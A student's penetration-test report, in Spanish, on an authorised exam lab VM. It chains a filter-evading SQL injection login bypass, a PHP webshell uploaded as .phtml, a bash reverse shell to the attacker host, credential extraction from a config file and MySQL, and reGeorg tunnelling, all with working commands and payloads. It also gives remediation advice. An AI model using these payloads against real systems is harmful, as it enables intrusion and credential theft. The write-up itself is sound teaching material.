# INFORME DE AUDITORÍA DE SEGURIDAD
**NorthBridge Solutions — Examen Tema 1**

- **Auditor:** Alejandro Mamán López-Mingo (D1n0)
- **Fecha:** 17/03/2026
- **Asignatura:** Hacking Ético — INSO3A

---

## 1. DATOS GENERALES

| Campo | Valor |
|---|---|
| Auditor/a | Alejandro Mamán / D1n0 |
| Fecha inicio | 17/03/2026 |
| Fecha fin | 17/03/2026 |
| Plataforma / Lab | Máquina Virtual — Examen U-TAD |
| Objetivo | 10.0.2.9 |
| Tipo de auditoría | Caja negra |
| Autorización | Entorno de examen autorizado — INSO3A 2025/26 |

---

## 2. RESUMEN EJECUTIVO

Realicé una auditoría de seguridad de caja negra sobre la máquina objetivo 10.0.2.9, en el contexto del examen práctico de la asignatura Hacking Ético (INSO3A). El objetivo era enumerar la superficie de ataque, identificar y explotar vulnerabilidades web, y lograr acceso remoto al sistema.

Identifiqué dos vulnerabilidades principales: una inyección SQL en el panel de login del área de administración, y una subida de ficheros sin restricciones efectivas que me permitió subir una webshell PHP. Encadenando ambas vulnerabilidades obtuve ejecución remota de comandos (RCE) con el usuario www-data y acceso interactivo al servidor mediante una reverse shell. Extraje credenciales de la base de datos y establecí un túnel SOCKS mediante reGeorg para intentar el acceso por SSH a localhost, aunque no pude completarlo por falta de tiempo.

**Resultado global:** `[X] Crítico`

### Vulnerabilidades encontradas

| Clasificación | Cantidad |
|---|---|
| Total | 2 |
| Críticas | 1 |
| Altas | 1 |
| Medias | 0 |
| Bajas | 0 |

---

## 3. ALCANCE Y LIMITACIONES

### Sistemas en scope
- `10.0.2.9` — Servidor web NorthBridge Solutions (Ubuntu Linux, Apache 2.4.18)

### Sistemas fuera de scope
- `10.0.2.3` — Gateway de red NAT
- `10.0.2.4` — Máquina atacante (Kali Linux)

### Limitaciones encontradas
- Errata en el examen: el fichero `message.txt` indicaba que habría claves SSH en `/tmp/`, pero no existían.
- MySQL configurado con `--secure-file-priv`, lo que me impidió usar `INTO OUTFILE` para escritura arbitraria.
- Acceso SSH root bloqueado desde redes externas, solo permitido desde localhost.
- No tuve acceso a `/etc/shadow` ni al historial bash de antonio por permisos insuficientes.

### Herramientas utilizadas
- **nmap** — Host discovery y escaneo de puertos/servicios
- **gobuster** — Fuzzing de directorios y ficheros
- **BurpSuite** — Interceptación, análisis y modificación de peticiones HTTP
- **sqlmap** — Detección automática de inyecciones SQL
- **netcat** — Listener para reverse shell
- **reGeorg** — Tunneling SOCKS sobre HTTP
- **proxychains4** — Encaminamiento de tráfico a través del túnel SOCKS
- **mysql** — Cliente MySQL para extracción de datos

---

## FASE 1 — OBTENCIÓN DE INFORMACIÓN

En esta fase hice reconocimiento activo sobre la red NAT para identificar el objetivo y obtener información inicial sobre los servicios expuestos.

### Reconocimiento de la máquina en la red

Lancé un host discovery sobre la subred 10.0.2.0/24 para identificar los hosts activos:

```bash
# d1n0@d1n0
$ nmap -sn -T4 10.0.2.0/24
```

Encontré tres hosts activos. Descartando el gateway (10.0.2.3) y mi propia máquina (10.0.2.4), el objetivo es **10.0.2.9**.

### Reconocimiento de servicios

Lancé un escaneo completo de puertos con detección de versiones y scripts NSE:

```bash
# d1n0@d1n0
$ nmap -sV -sC -p- -T4 10.0.2.9
```

| Puerto | Protocolo | Servicio | Versión |
|---|---|---|---|
| 22/tcp | TCP | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | TCP | HTTP | Apache httpd 2.4.18 (Ubuntu) |

---

## FASE 2 — ENUMERACIÓN DE EQUIPOS

Accedí a `http://10.0.2.9` y encontré una página corporativa estática de NorthBridge Solutions. Tenía un formulario de suscripción por email, pero al analizar la petición con BurpSuite vi que el input no tenía atributo `name`, así que el email nunca llegaba al servidor. El formulario era puramente decorativo.

### Fuzzing de directorios — raíz

```bash
# d1n0@d1n0
$ gobuster dir -u http://10.0.2.9 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Rutas de interés encontradas:
- `/admin` — Panel de administración (redirección 301)
- `/uploads` — Directorio de subida de archivos
- `/message.txt` — Fichero de texto accesible (200)

### Contenido de message.txt

Accedí a `http://10.0.2.9/message.txt` y encontré el siguiente mensaje:

> *El administrador ha tenido algunos problemas, de manera que ha bloqueado el acceso como root por SSH, permitiendo únicamente el acceso mediante localhost. Se puede hacer uso de las claves existentes en /tmp para conectarse con clave privada-pública.*

El acceso SSH como root estaba bloqueado desde el exterior, solo permitido desde localhost. Esto definió el objetivo final: obtener RCE y tunelizar SSH a localhost.

### Fuzzing de directorios — /admin/

```bash
# d1n0@d1n0
$ gobuster dir -u http://10.0.2.9/admin/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Ficheros relevantes encontrados:
- `login.php` — Panel de autenticación
- `upload.php` — Funcionalidad de subida de archivos
- `db.php` — Fichero de configuración de base de datos (tamaño 0 en respuesta, incluido por otros scripts)

---

## FASE 3 — ANÁLISIS DE VULNERABILIDADES

### Checklist OWASP
- `[X]` Input Validation Testing — SQL Injection en login.php
- `[X]` Input Validation Testing — Subida de ficheros sin restricciones efectivas en upload.php
- `[ ]` Authentication Testing — Probé credenciales por defecto, no funcionaron
- `[ ]` Information Gathering — Exposición de message.txt y db.php

### Vulnerabilidades identificadas

| # | Vulnerabilidad | Severidad | URL / Servicio | Estado |
|---|---|---|---|---|
| V-01 | SQL Injection — Bypass de autenticación | Crítica | /admin/login.php | Confirmada |
| V-02 | Subida de ficheros — Evasión de filtros | Alta | /admin/upload.php | Confirmada |

### V-01: SQL Injection en login.php

El parámetro `username` del formulario de login es vulnerable a inyección SQL. La aplicación aplica un filtro que bloquea `OR`, espacios y algunos caracteres especiales, pero pude evadirlo usando comentarios SQL inline (`/**/`) en lugar de espacios y el operador `||` en lugar de `OR`.

SQLMap no detectó la vulnerabilidad automáticamente por el filtro activo, así que la identifiqué y exploté de forma manual.

### V-02: File Upload sin restricciones efectivas en upload.php

La funcionalidad de subida de archivos en `/admin/upload.php` aplica dos filtros: extensión del fichero y Content-Type. Pude evadir ambos de forma independiente: el filtro de extensión rechaza `.php` pero acepta `.phtml` (extensión alternativa que Apache interpreta como PHP), y el filtro de Content-Type solo valida la cabecera HTTP, no el contenido real del fichero.

---

## FASE 4 — EXPLOTACIÓN

### Explotación de V-01: SQL Injection — Bypass de autenticación

**Descripción:** La aplicación filtra algunos caracteres pero no de forma completa. Identifiqué el bypass progresivamente mediante prueba y error con BurpSuite Repeater.
**Vector de ataque:** Parámetro `username` en POST /admin/login.php
**Herramienta:** BurpSuite
**CVE:** N/A

**Proceso seguido:**

**Paso 1 — Detección del punto de inyección.** Intercepté la petición POST a `/admin/login.php` con BurpSuite. El body contenía: `username=test&password=test&submit=`

**Paso 2 — Prueba con SQLMap (fallida).** SQLMap no encontró inyección en `username` ni `password`, incluso con tamper `space2comment` y `--level=3 --risk=2`. El filtro bloqueaba los payloads automáticos.

```bash
# d1n0@d1n0 — FALLIDO
$ sqlmap -u "http://10.0.2.9/admin/login.php" --data="username=test&password=test&submit=" -p username --dbs --batch
$ sqlmap -u "http://10.0.2.9/admin/login.php" --data="username=test&password=test&submit=" -p password --dbs --batch --tamper=space2comment --level=3 --risk=2
```

**Paso 3 — Bypass manual.** Fui probando inyecciones progresivamente en BurpSuite Repeater:

- Comilla simple `'` — no produce error → vulnerable
- `' OR '1'='1'--` → bloqueado ("Caracteres inválidos detectados")
- `' || '1'='1'--` → bloqueado
- `admin'/**/||/**/1=1#` → **PASA**

**Payload final utilizado:**
```
username=admin'/**/||/**/1=1#&password=test&submit=
```

**Resultado:** `[X] Éxito` — Accedí al panel de administración como usuario admin.

---

### Explotación de V-02: Subida de webshell PHP

**Descripción:** Una vez dentro del panel de administración, subí una webshell PHP para obtener RCE en el servidor.
**Vector de ataque:** Funcionalidad de upload en /admin/upload.php
**Herramienta:** BurpSuite
**CVE:** N/A

**Proceso seguido:**

**Paso 1 — Análisis del filtro.** Subí un fichero `.txt` → respuesta: `Only image files allowed!`. Subí una imagen `.png` real → aceptada correctamente.

**Paso 2 — Evasión del filtro de extensión.** Probé subir `shell.php.png` — pasaba el filtro pero no se ejecutaba como PHP. Intenté subir `shell.php` cambiando el Content-Type → el servidor rechazó la extensión `.php` explícitamente. Creé un fichero `.phtml`, extensión alternativa que Apache interpreta como PHP:

```bash
# d1n0@d1n0
$ echo '<?php system($_GET["cmd"]); ?>' > shell.phtml
```

**Paso 3 — Evasión del filtro de Content-Type.** Subí `shell.phtml` modificando la cabecera `Content-Type` en BurpSuite Repeater de `application/octet-stream` a `image/png`. El servidor aceptó la subida.

**Paso 4 — Verificación de RCE.** Accedí a la webshell:

```
http://10.0.2.9/uploads/shell.phtml?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmé ejecución remota de comandos con el usuario www-data.

**Paso 5 — Reverse shell.** Puse un listener en Kali y lancé una reverse shell bash desde la webshell:

```bash
# d1n0@d1n0
$ nc -lvnp 4444
```

```
# Navegador / webshell
http://10.0.2.9/uploads/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.2.4/4444+0>%261'
```

**Resultado:** `[X] Éxito` — Obtuve una reverse shell interactiva como `www-data@hacking1`.

---

## FASE 5 — POST-EXPLOTACIÓN

### Reconocimiento interno

Desde la reverse shell exploré el sistema en busca de información útil para escalar privilegios.

```bash
# www-data@hacking1
$ find / -name "id_rsa" 2>/dev/null        # Sin resultados — errata del examen
$ cat /etc/passwd | grep -v nologin | grep -v false
# → root, sync, antonio (uid 1002, /home/antonio)
$ ls -la /home/antonio/
# → Sin carpeta .ssh ni claves
$ cat /home/antonio/.bash_history          # → Permission denied
```

### Extracción de credenciales — db.php

Leí el fichero de configuración de base de datos:

```bash
# www-data@hacking1
$ cat /var/www/html/admin/db.php
```

Credenciales MySQL obtenidas: **root / SuperS3cR3TPassw0rd$$$!**

### Extracción de datos — MySQL

Accedí a MySQL con las credenciales encontradas:

```bash
# www-data@hacking1
$ mysql -u root -p'SuperS3cR3TPassw0rd$$$!' -e "show databases;"
$ mysql -u root -p'SuperS3cR3TPassw0rd$$$!' -e "show tables;" examenDDBB
$ mysql -u root -p'SuperS3cR3TPassw0rd$$$!' -e "select * from admin;" examenDDBB
```

Credenciales adicionales extraídas de la tabla `admin`: **masteradmin / S3cur3P4ssUTAD**

### Intento de acceso SSH mediante tunneling reGeorg

Según `message.txt`, el acceso SSH como root solo era posible desde localhost. Usé reGeorg para crear un túnel SOCKS a través de la webshell.

**Paso 1 — Subida del tunnel.nosocket.phtml.** Intenté subir `tunnel.php` pero no ejecutaba; usé `tunnel.nosocket.php` con el mismo bypass de Content-Type. Lo verifiqué con curl:

```bash
# d1n0@d1n0
$ curl http://10.0.2.9/uploads/tunnel.nosocket.phtml
# → Georg says, 'All seems fine'
```

**Paso 2 — Activé el túnel:**

```bash
# d1n0@d1n0
$ python2.7 reGeorgSocksProxy.py -u http://10.0.2.9/uploads/tunnel.nosocket.phtml -p 8888
```

**Paso 3 — Configuré proxychains.** Edité `proxychains4.conf` con `dynamic_chain` y `socks5 127.0.0.1 8888` como único proxy.

**Paso 4 — Intentos de conexión SSH (fallidos):**

```bash
# d1n0@d1n0 — FALLIDOS
$ proxychains -f ./proxychains4.conf ssh root@127.0.0.1      # SuperS3cR3TPassw0rd$$$! → Permission denied
$ proxychains -f ./proxychains4.conf ssh antonio@127.0.0.1   # SuperS3cR3TPassw0rd$$$! → Permission denied
$ proxychains -f ./proxychains4.conf ssh root@127.0.0.1      # S3cur3P4ssUTAD → Permission denied
$ proxychains -f ./proxychains4.conf ssh antonio@127.0.0.1   # S3cur3P4ssUTAD → Permission denied
```

También intenté hacer `su` desde la reverse shell tras upgradear la TTY con python3 pty — todos los intentos devolvieron `Authentication failure`.

**Intento alternativo — escritura de clave pública vía MySQL:**

Generé un par de claves RSA e intenté escribir la clave pública en `/root/.ssh/authorized_keys` mediante `INTO OUTFILE` en MySQL:

```bash
# d1n0@d1n0
$ ssh-keygen -t rsa -f /tmp/examen_key -N ""
```

```bash
# www-data@hacking1 — FALLIDO
$ mysql -u root -p'SuperS3cR3TPassw0rd$$$!' -e "select '[clave_publica]' INTO OUTFILE '/root/.ssh/authorized_keys';" examenDDBB
# → ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option
```

No pude completar el acceso SSH por las restricciones del sistema y falta de tiempo.

---

## 6. HALLAZGOS Y VULNERABILIDADES

### HALLAZGO 1 — SQL Injection en panel de login

- **Severidad:** `[X] Crítica`
- **CVSS Score:** 9.8 / 10
- **CVE:** N/A
- **CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command

**Descripción:** El parámetro `username` del formulario POST `/admin/login.php` es vulnerable a inyección SQL. La consulta se construye sin parametrización, lo que permite modificar la lógica de autenticación. Aunque existe un filtro que bloquea `OR` y algunos caracteres, pude evadirlo usando comentarios MySQL (`/**/`) como sustituto de espacios y el operador `||` como alternativa a `OR`.

**Impacto:** Un atacante puede autenticarse en el panel de administración sin ninguna credencial válida, obteniendo acceso completo a las funcionalidades de administración, incluyendo la subida de archivos que permite RCE.

**Evidencia:** Payload funcional: `username=admin'/**/||/**/1=1#&password=test&submit=`

**Recomendación:** Usar consultas parametrizadas (prepared statements) con PDO o mysqli. Nunca construir queries concatenando input de usuario directamente. Complementar con validación de entrada en servidor y aplicar principio de mínimo privilegio al usuario de base de datos.

---

### HALLAZGO 2 — Subida de ficheros sin restricciones efectivas

- **Severidad:** `[X] Alta`
- **CVSS Score:** 8.8 / 10
- **CVE:** N/A
- **CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type

**Descripción:** La funcionalidad de upload en `/admin/upload.php` aplica un filtro basado en extensión de fichero y Content-Type HTTP. Ambos controles son insuficientes: el filtro de extensión no contempla extensiones alternativas como `.phtml` que Apache ejecuta como PHP, y el filtro de Content-Type solo valida la cabecera HTTP, que pude modificar trivialmente con BurpSuite.

**Impacto:** Un atacante autenticado puede subir una webshell PHP y obtener ejecución remota de comandos con los privilegios del proceso Apache (www-data). Desde ahí puede leer ficheros de configuración, extraer credenciales, establecer reverse shells y pivotar hacia otros sistemas.

**Evidencia:** Subí `shell.phtml` con `Content-Type: image/png`. Acceso en: `http://10.0.2.9/uploads/shell.phtml?cmd=id` → `uid=33(www-data)`

**Recomendación:** Mantener una whitelist estricta de extensiones permitidas que no incluya ninguna interpretable como PHP. Almacenar los ficheros subidos fuera del docroot o en un directorio sin ejecución de scripts. Renombrar los ficheros al subirse. Validar el tipo real del fichero mediante su firma (magic bytes).

---

## 7. CONCLUSIONES

La auditoría reveló un nivel de seguridad insuficiente en la aplicación web NorthBridge Solutions. Las dos vulnerabilidades que identifiqué, SQL Injection y File Upload sin restricciones efectivas, son críticas y encadenándolas obtuve ejecución remota de comandos en el servidor en poco tiempo.

El vector de ataque principal fue la falta de parametrización en las consultas SQL del panel de login, que me permitió bypassear la autenticación a pesar de los filtros implementados. Estos filtros, basados en blacklists de caracteres, son inherentemente inseguros y pueden evadirse con variantes de sintaxis SQL estándar.

Una vez dentro del panel de administración, la funcionalidad de subida de archivos no aplicó ninguna validación real del contenido, lo que me permitió subir código PHP ejecutable con solo cambiar la extensión y el Content-Type de la petición.

Adicionalmente, encontré credenciales en claro en el fichero `db.php` y extraje credenciales adicionales de la base de datos MySQL. Establecí un túnel SOCKS mediante reGeorg para acceder al SSH restringido a localhost, aunque no pude completar el acceso final.

**Nivel de riesgo global:** `[X] Crítico`

---

## 9. ANEXOS / EVIDENCIAS

### Log de todos los comandos ejecutados

> Generado tras pasar todas las capturas realizadas en el examen.

#### d1n0@d1n0 (Kali local) — Exitosos

```bash
$ nmap -sn -T4 10.0.2.0/24
$ nmap -sV -sC -p- -T4 10.0.2.9
$ gobuster dir -u http://10.0.2.9 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
$ gobuster dir -u http://10.0.2.9/admin/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
$ echo '<?php system($_GET["cmd"]); ?>' > shell.phtml
$ nc -lvnp 4444
$ curl http://10.0.2.9/uploads/tunnel.nosocket.phtml
$ python2.7 reGeorgSocksProxy.py -u http://10.0.2.9/uploads/tunnel.nosocket.phtml -p 8888
$ ssh-keygen -t rsa -f /tmp/examen_key -N ""
```

#### Webshell (navegador) — Exitosos

```
http://10.0.2.9/uploads/shell.phtml?cmd=id
http://10.0.2.9/uploads/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.2.4/4444+0>%261'
```

#### www-data@hacking1 (reverse shell) — Exitosos

```bash
$ find / -name "id_rsa" 2>/dev/null
$ cat /etc/passwd | grep -v nologin | grep -v false
$ ls -la /home/antonio/
$ cat /var/www/html/admin/db.php
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ mysql -u root -p'SuperS3cR3TPassw0rd$$$!' -e "show databases;"
$ mysql -u root -p'SuperS3cR3TPassw0rd$$$!' -e "show tables;" examenDDBB
$ mysql -u root -p'SuperS3cR3TPassw0rd$$$!' -e "select * from admin;" examenDDBB
```

---

### Comandos que NO funcionaron / intentos fallidos

#### d1n0@d1n0 (Kali local) — Fallidos

```bash
# SQLMap - no detectó inyección en username
$ sqlmap -u "http://10.0.2.9/admin/login.php" --data="username=test&password=test&submit=" -p username --dbs --batch

# SQLMap con tamper - tampoco detectó nada
$ sqlmap -u "http://10.0.2.9/admin/login.php" --data="username=test&password=test&submit=" -p password --dbs --batch --tamper=space2comment --level=3 --risk=2

# SSH con contraseña de db.php - Permission denied
$ proxychains -f ./proxychains4.conf ssh root@127.0.0.1      # password: SuperS3cR3TPassw0rd$$$!
$ proxychains -f ./proxychains4.conf ssh antonio@127.0.0.1   # password: SuperS3cR3TPassw0rd$$$!

# SSH con contraseña de MySQL - Permission denied
$ proxychains -f ./proxychains4.conf ssh root@127.0.0.1      # password: S3cur3P4ssUTAD
$ proxychains -f ./proxychains4.conf ssh antonio@127.0.0.1   # password: S3cur3P4ssUTAD
```

#### BurpSuite (peticiones modificadas) — Fallidas

```
# Subir shell.php con Content-Type: image/png → rechazado por extensión
# Subir tunnel.php con Content-Type: image/png → subió pero no ejecutaba como PHP
# SQLi: username=' OR '1'='1'-- → "Caracteres inválidos detectados"
# SQLi: username=' || '1'='1'-- → "Caracteres inválidos detectados"
```

#### www-data@hacking1 (reverse shell) — Fallidos

```bash
# Sin TTY
$ su antonio                                       # → su: must be run from a terminal

# Tras upgradear TTY con python3 pty
$ su antonio  # password: S3cur3P4ssUTAD           # → Authentication failure
$ su antonio  # password: SuperS3cR3TPassw0rd$$$!  # → Authentication failure
$ su root     # password: S3cur3P4ssUTAD           # → Authentication failure
$ su root     # password: SuperS3cR3TPassw0rd$$$!  # → Authentication failure

# Sin permisos
$ cat /etc/shadow                                  # → Permission denied
$ cat /home/antonio/.bash_history                  # → Permission denied

# MySQL INTO OUTFILE bloqueado por --secure-file-priv
$ mysql -u root -p'SuperS3cR3TPassw0rd$$$!' -e "select '[clave_publica]' INTO OUTFILE '/root/.ssh/authorized_keys';" examenDDBB
# → ERROR 1290 (HY000): --secure-file-priv option
```
